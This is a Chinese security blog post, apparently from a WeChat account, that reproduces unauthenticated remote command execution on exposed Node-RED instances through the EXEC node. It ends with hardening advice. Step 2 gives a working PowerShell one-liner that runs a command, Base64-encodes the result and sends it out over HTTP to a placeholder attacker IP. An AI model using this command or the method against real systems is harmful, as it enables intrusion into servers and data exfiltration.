---
title: Node-RED EXEC 节点未授权命令执行漏洞复现
url: https://mp.weixin.qq.com/s/Dv295GjxO59yH3-dnbNVGA
source: Doonsec's feed
date: 2026-05-13
fetch_date: 2026-05-14T05:42:44.969180
---

# Node-RED EXEC 节点未授权命令执行漏洞复现

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/eMTyD09PvaZGbbgKoJKyL9Jz5HTw8aUiaRDVIuDNBZBXMrrIM5AbHV1d4ukibPpX6pxtUZ0Qpeibw5Ozp3Mva5wVDCyOj4hAicsb8GCy2WW5ZG8/0?wx_fmt=jpeg)

# Node-RED EXEC 节点未授权命令执行漏洞复现

原创

whoami0002
whoami0002

SecurityPaper

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

最近攻防演练中遇到了一个存在未授权访问的 Node-RED 管理界面，记录一下利用过程。

Node-RED 是一款基于 Node.js 的可视化流编程工具，广泛应用于 IoT 和自动化场景。当管理界面存在未授权访问时，攻击者可通过拖拽 EXEC 节点直接执行任意系统命令，实现 RCE。

## 0x01 漏洞概述

* **漏洞类型：** 未授权命令执行（RCE）
* **影响组件：** Node-RED EXEC 节点
* **前提条件：** Node-RED 管理界面可未授权访问（默认无认证）
* **危害等级：** 高危（可直接获取服务器权限）

## 0x02 漏洞复现

### Step 1：新建 Inject 节点

在 Node-RED 编辑器中拖入一个 **inject** 节点，用于触发后续流程。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/eMTyD09PvaYzQKyyRANhEmcYopJGvmicUY7a9F4Wd1Ocb2OZgmDcxXOf1ppV1M1TP5uicnql6l7xXLP2ywmfAwwNQ6yFcxeYh9YRoibibPhx31w/640?wx_fmt=png&from=appmsg)

### Step 2：新建 Exec 节点并构造命令

拖入一个 **exec** 节点，连接到 inject 节点后配置命令内容。

经测试，exec 节点执行命令**无回显**，因此采用 PowerShell 将命令结果 Base64 编码后通过 HTTP 请求外带到攻击者服务器：

```
cmd.exe /c powershell -Command "& { $base64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((whoami | Out-String))); $encodedUrl = 'http://<攻击机IP>:8080/?data=' + [System.Net.WebUtility]::UrlEncode($base64); Invoke-RestMethod -Uri $encodedUrl }"
```

![](https://mmbiz.qpic.cn/mmbiz_png/eMTyD09PvaaWIHUHGaVgVm6nmkWqw1fDQ7VOFUDwAvpKkF4zTfYm9nnKE4IyBV3X8j2uljUsvPGoQIdTpohRS2AtELmzBwnI4ZMnBFsrMxA/640?wx_fmt=png&from=appmsg)

> **踩坑提醒：** exec 节点配置中**不要勾选**`msg.payload`，否则 inject 节点传递的时间戳会被拼接到命令末尾，导致命令执行失败。

### Step 3：添加 Debug 节点

拖入一个 **debug** 节点连接到 exec 节点之后，用于调试输出。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/eMTyD09Pvabp4tcn9cPQHA1oJyHPVBH7ziav1CVfzUxJjqeLjvGXQiaa2ODicmwowxgYvz5dffWQlkrpU8mQnDuhHSic25vTgoMS3xogtG4xJPg/640?wx_fmt=png&from=appmsg)

### Step 4：部署并触发

点击右上角 **Deploy** 按钮部署流程，部署完成后点击 inject 节点左侧按钮即可触发命令执行。

![](https://mmbiz.qpic.cn/mmbiz_png/eMTyD09PvaZOOFLKibYUd3UgosHZJI4TeZWU4kcSL1aoEMD7zfibKn7fqJy8n5sILBsdztjBLC6zxcVEcRVghIQVYufMNaQSia2wapgReWWge0/640?wx_fmt=png&from=appmsg)

攻击者在 HTTP 服务端收到外带数据，Base64 解码后即可获得命令执行结果：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/eMTyD09PvaZqgy10hZGib6xV5E2GMEr5gke8ZwR9jQEOULTibauaw5G7ot2NtIEicKv1M3Lx76UZIEPDItkVDyCgY0b6zStvC2UYv6D7YQI2R4/640?wx_fmt=png&from=appmsg)

## 0x03 漏洞分析

Node-RED 的 EXEC 节点本质上是对 `child_process.exec()` 的封装。当管理界面缺乏认证保护时，任何能访问到该页面的用户都可以：

1. 创建包含任意命令的 EXEC 节点
2. 通过 inject 节点或 HTTP 请求触发执行
3. 利用 DNSLog / HTTP 外带等方式获取回显

   整个利用过程无需任何编程，纯可视化操作，攻击门槛极低。

## 0x04 修复建议

1. **启用认证：** 在 `settings.js` 中配置 `adminAuth`，为管理界面设置用户名密码
2. **网络隔离：** 将 Node-RED 服务绑定到内网地址，禁止外部直接访问
3. **反向代理：** 通过 Nginx 等反向代理添加额外的访问控制和 HTTPS 加密
4. **禁用高危节点：** 在 `settings.js` 中通过 `functionGlobalContext` 限制可用的节点类型

```
// settings.js 中启用认证示例
adminAuth: {
    type: "credentials",
    users: [{
        username: "admin",
        password: "$2a$08$...",  // bcrypt hash
        permissions: "*"
    }]
}
```

## 0x05 总结

Node-RED 的低代码特性使其极易被滥用。在实际攻防中，Node-RED 常作为 IoT 设备管理平台暴露在公网，且大量实例未配置认证。通过 EXEC 节点实现 RCE 是一种简单高效的攻击路径。

![](https://mmbiz.qpic.cn/mmbiz_jpg/iazag5vDeG2eaxibeBNfPejSVIBK5HheVW2Bia2FnzibxhdaNUOib6bdnxMqIF3RMleIKhx2sRYlcqmatpDGtosBaqQ/640?wx_fmt=jpeg)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/iazag5vDeG2exlukbZwEVKyIohKDySVQPQXJw5KrBSsqITHv1B8mjkLrJ0vJlibicfsHng5MPDsIGD4biaRjziaZX8g/0?wx_fmt=png)

SecurityPaper

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/iazag5vDeG2exlukbZwEVKyIohKDySVQPQXJw5KrBSsqITHv1B8mjkLrJ0vJlibicfsHng5MPDsIGD4biaRjziaZX8g/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过